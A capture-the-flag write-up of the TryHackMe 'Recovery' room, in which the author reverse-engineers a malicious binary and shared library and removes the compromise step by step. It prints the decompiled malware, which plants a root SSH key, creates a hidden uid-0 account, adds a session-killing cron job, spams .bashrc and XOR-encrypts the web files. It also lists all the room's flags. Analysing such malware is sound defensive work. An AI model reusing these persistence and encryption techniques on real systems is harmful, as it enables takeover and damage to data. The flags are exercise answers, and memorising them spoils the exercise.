

# Tryhackme.com Room : Recovery

`https://tryhackme.com/room/recovery`



The server has been compromised via a binary called `fixutil`

When logging in via `ssh` the "user" complain that the shell just pop some :

```
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
```



They give use the `ssh` credentials :

```
Username: alex
Password: madeline
```



When we connect to the server we get the message and we can't really do anything because our shell is flooded.



We can execute ssh command remotely without logging in tho

```
sshpass -p madeline ssh alex@10.10.175.229 "ls"
```

We see that the `fixutil` binary is in `~`

We can also retrieve the binary using `scp`

```
sshpass -p madeline scp alex@10.10.175.229:fixutil .
```

Now that we got the binary, we can decompile it in `ghidra` .

Here is the `main` function :

```c
{
  FILE *pFVar1;
  
  pFVar1 = fopen("/home/alex/.bashrc","a");
  fwrite("\n\nwhile :; do echo \"YOU DIDN\'T SAY THE MAGIC WORD!\"; done &\n",1,0x3c,pFVar1);
  fclose(pFVar1);
  system("/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so");
  pFVar1 = fopen("/lib/x86_64-linux-gnu/liblogging.so","wb");
  fwrite(&bin2c_liblogging_so,0x5a88,1,pFVar1);
  fclose(pFVar1);
  system("echo pwned | /bin/admin > /dev/null");
  return 0;
}
```



First a `while` loop is appended to `.bashrc` which prevent us from doing any commands.

Let's fix this.

We can get a basic shell without `.bashrc` execution using 

```
sshpass -p madeline ssh alex@10.10.175.229 "/bin/sh"
```

From there, we can remove the last line of `.bashrc` using

```
sed -i "$ d" .bashrc
```

And we now have access to a normal `ssh` shell.

We browse `:1337/` and we retrieve the first flag :

```
THM{d8b5c89061ed767547a782e0f9b0b0fe}
```

We see that every minutes, we get logged out. This is probably some `cronjob` running killing the `bash` session. We can launch a bunch of `bash` process so that we at least not get disconnected every minutes.

A better way is to `ln -snf /bin/bash safe` and launch a shell via our new `safe` symlink. This won't get killed by `pkill bash`

Can't find anything in `/etc/crontab` and `crontab -l`



The file is actually in `/etc/cron.d/evil` :

```
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
```

The script it call `/opt/brilliant_script.sh` is :

```
#!/bin/sh

for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
```

Which is the one killing our `bash` instances

We can edit `/opt/brilliant_script.sh`

Let's remove the line that kill bash and get a `root` reverse shell from there

Now we got a `root` shell. Let's go back to reversing.

Also, by removing the line that kill bash in `/opt/brilliant_script.sh` we get a second flag :

```
Flag 1: THM{4c3e355694574cb182ca3057a685509d}
```



Now that we have a `root` shell, we can insert our public key in `/root/.ssh/authorized_keys` and login via ssh.

Looking at `/root/.ssh/authorized_keys` we see that there is a rogue key in there.

Deleting this key give us another flag :

```
Flag 3: THM{70f7de17bb4e08686977a061205f3bf0}
```



Let's retrieve `/lib/x86_64-linux-gnu/liblogging.so`

We decompile it with `ghidra`. Looking around, we find the function `LogIncorrectAttempt` which contains :

```c
{
  time_t tVar1;
  FILE *pFVar2;
  char *ssh_key;
  FILE *authorized_keys;
  FILE *script_f;
  FILE *cron_f;
  
  system("/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so");
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  pFVar2 = fopen("/root/.ssh/authorized_keys","w");
  fprintf(pFVar2,"%s\n",
                    
          "ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery"
         );
  fclose(pFVar2);
  system("/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null");
  system(
        "/bin/echo\'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/\' | /usr/sbin/chpasswd -e"
        );
  XOREncryptWebFiles();
  pFVar2 = fopen("/opt/brilliant_script.sh","w");
  fwrite(
         "#!/bin/sh\n\nfor i in $(ps aux | grep bash | grep -v grep | awk \'{print $2}\'); do kill$i; done;\n"
         ,1,0x5f,pFVar2);
  fclose(pFVar2);
  pFVar2 = fopen("/etc/cron.d/evil","w");
  fwrite("\n* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog\n\n",1,0x3d,pFVar2);
  fclose(pFVar2);
  chmod("/opt/brilliant_script.sh",0x1ff);
  chmod("/etc/cron.d/evil",0x1ed);
  return;
}
```

First, we see that there is a backup of the `/lib/x86_64-linux-gnu/liblogging.so` in `/lib/x86_64-linux-gnu/oldliblogging.so`.

We can use our root shell to put back the original file.

Doing so give us another flag :

```
Flag 2: THM{72f8fe5fd968b5817f67acecdc701e52}
```



Next, we confirm that there is an `authorized_key` that is being added to the user `root`

We already removed it so nothing to do here.



Next, we see that a rogue user `security` is added to the system.

Let's remove it with `userdel security`. We get the error :

```
userdel: user security is currently used by process 1
```

Looking at `ps -aux` :

```
root         1  0.3  0.1   2388   676 ?        Ss   20:05   0:06 /bin/sh -c /root/init_script.sh
```

Hmm, this is runned as root, but I guess the problem is that the user `security` has an userid of `0` so it mixe up with the `root` user.

So the user is masquarading as `root`. We can simply remove the entry from `/etc/passwd` and `/etc/shadow`

And we get another flag :

```
Flag 4: THM{b0757f8fb8fe8dac584e80c6ac151d7d}
```





Nextup, we see the function `XOREncryptWebFiles()`

We see in `ghidra` :

```c
  int iVar1;
  char *str;
  FILE *__stream;
  char **webfiles;
  long lVar2;
  stat *psVar3;
  long in_FS_OFFSET;
  byte bVar4;
  int i;
  int amnt_webfiles;
  char *encryption_key;
  FILE *encryption_file;
  char **webfile_names;
  stat stat_res;
  long local_10;
  
  bVar4 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  str = (char *)malloc(0x11);
  if (str == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  rand_string(str,0x10);
  lVar2 = 0x12;
  psVar3 = &stat_res;
  while (lVar2 != 0) {
    lVar2 = lVar2 + -1;
    psVar3->st_dev = 0;
    psVar3 = (stat *)((long)psVar3 + (ulong)bVar4 * -0x10 + 8);
  }
  iVar1 = stat(encryption_key_dir,(stat *)&stat_res);
  if (iVar1 == -1) {
    mkdir(encryption_key_dir,0x1c0);
  }
  __stream = fopen("/opt/.fixutil/backup.txt","a");
  fprintf(__stream,"%s\n",str);
  fclose(__stream);
  webfiles = (char **)malloc(8);
  if (webfiles == (char **)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = GetWebFiles(webfiles,8);
  i = 0;
  while (i < iVar1) {
    XORFile(webfiles[i],str);
    free(webfiles[i]);
    i = i + 1;
  }
  free(webfiles);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
```

So here, the program create a random encryption key `str` and store it in `/opt/.fixutil/backup.txt`

It's value is :

```
AdsipPewFlfkmll
```



The `encryption_key_dir` value is hardcoded in the binary to `/opt/.fixutil/`

It then call `GetWebFiles` which is 

```c
  int iVar1;
  DIR *__dirp;
  size_t sVar2;
  size_t sVar3;
  char *__dest;
  dirent *pdVar4;
  int i;
  DIR *d;
  dirent *dir;
  char *webfile;
  
  i = 0;
  __dirp = opendir(web_location);
  if (__dirp != (DIR *)0x0) {
    do {
      do {
        pdVar4 = readdir(__dirp);
        if (pdVar4 == (dirent *)0x0) {
          closedir(__dirp);
          return i;
        }
        iVar1 = strcmp(pdVar4->d_name,".");
      } while ((iVar1 == 0) || (iVar1 = strcmp(pdVar4->d_name,".."), iVar1 == 0));
      sVar2 = strlen(web_location);
      sVar3 = strlen(pdVar4->d_name);
      __dest = (char *)malloc(sVar3 + sVar2 + 1);
      if (__dest == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      strcpy(__dest,web_location);
      sVar2 = strlen(pdVar4->d_name);
      strncat(__dest,pdVar4->d_name,sVar2);
      webfiles[i] = __dest;
      i = i + 1;
    } while (i < max_amnt_webfiles);
    closedir(__dirp);
  }
  return i;
```

`web_location` is hardcoded to `/usr/local/apache2/htdocs/`



Once it retrieve all file handles from `web_location` it calls `XORFiles` which is

```c
  int iVar1;
  FILE *pFVar2;
  long lVar3;
  void *__ptr;
  size_t sVar4;
  int i;
  int size;
  int index_of_encryption_key;
  FILE *webfile_r;
  char *f_contents;
  FILE *webfile_w;
  
  pFVar2 = fopen(f_path,"rb");
  fseek(pFVar2,0,2);
  lVar3 = ftell(pFVar2);
  iVar1 = (int)lVar3;
  fseek(pFVar2,0,0);
  __ptr = malloc((long)iVar1);
  fread(__ptr,1,(long)iVar1,pFVar2);
  fclose(pFVar2);
  i = 0;
  while (i < iVar1) {
    sVar4 = strlen(encryption_key);
    *(byte *)((long)__ptr + (long)i) =
         *(byte *)((long)__ptr + (long)i) ^ encryption_key[(int)((ulong)(long)i % sVar4)];
    i = i + 1;
  }
  pFVar2 = fopen(f_path,"wb");
  fwrite(__ptr,1,(long)iVar1,pFVar2);
  fclose(pFVar2);
  return;
```



So we see that it's a simply `xor` encryption.

Now that we have the key, we can decode it easily.

We retrieve all the web files using `scp` and use this small python script to decrypt the files :

```python
import os

key = 'AdsipPewFlfkmll'
key_len = len(key)

to_decode = ['todo.html', 'index.html', 'reallyimportant.txt']

for file in to_decode:
	encoded_text = open(file, 'r').read()

	recovered = ""
	for i, c in enumerate(encoded_text):
		recovered += chr(ord(c) ^ ord(key[i % key_len]))

	os.rename(file, file + ".encrypted")

	with open(file, 'w') as f:
		f.write(recovered)

print("done")
```

So now we recovered all the files, we just need to upload them back using `scp`

Hmm seems like there is some problems with our decryption. First the `reallyimportant.txt` file is still parts encrypted.

Then, the `index.html` file has some typos in it which might indicate a problem with our decryption. Hmmm.



The only flag missing is the one for the decryption of the files (I guess ?).



Not sure what went wrong with the decryption most of the decrypted content is good, if the key was wrong we would see more artifact ?



Maybe we can find what is running the `flag dashboard` on port `1337` 

Didn't have much luck finding what is running `1337`

But I did figure out what was my error in the decoding process.

The file need to be read as binary (Duh !).

When reading as a string, python removes `\r` characters (And maybe others) so we were missing some encrypted bytes.

So here is the corrected python script :

```python
import os

key = 'AdsipPewFlfkmll'.encode('utf-8')
key_len = len(key)

to_decode = ['todo.html', 'index.html', 'reallyimportant.txt']
to_decode = ['todo.html']

for file in to_decode:
	encoded_text = open(file, 'rb').read()

	recovered = bytearray()
	for i, c in enumerate(encoded_text):
		recovered.append(c ^ key[i % key_len])

	os.rename(file, file + ".encrypted")

	with open(file, 'wb') as f:
		f.write(recovered)

print("done")
```

With that, we get the final flag :

```
Flag 0: THM{d8b5c89061ed767547a782e0f9b0b0fe}

Flag 1: THM{4c3e355694574cb182ca3057a685509d}

Flag 2: THM{72f8fe5fd968b5817f67acecdc701e52}

Flag 3: THM{70f7de17bb4e08686977a061205f3bf0}

Flag 4: THM{b0757f8fb8fe8dac584e80c6ac151d7d}

Flag 5: THM{088a36245afc7cb935f19f030c4c28b2}
```





## Wrap up

* One thing that I didn't mention during the reversing part. `LogIncorrectAttempt` is actually called by `/bin/admin` when it get a wrong password. Changing the shared lib allowed the attacked to trigger their exploit by calling `echo pwned | /bin/admin` 
* Still wondering how we could have got access to the service running on port `1337`